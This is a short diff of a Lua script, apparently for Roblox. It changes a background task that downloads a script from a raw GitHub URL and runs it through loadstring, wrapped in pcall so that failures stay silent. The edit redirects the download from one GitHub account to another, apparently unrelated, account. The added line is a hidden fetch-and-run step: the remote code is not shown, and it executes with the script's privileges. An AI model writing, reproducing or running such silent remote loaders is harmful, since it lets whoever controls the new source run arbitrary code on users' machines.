@@ -716,7 +716,7 @@ end)
 
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/objwghd-maker/12HB/refs/heads/main/script%20Lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AAAA123218a/12HB/refs/heads/main/script%20Lua"))()
     end)
 end)
 
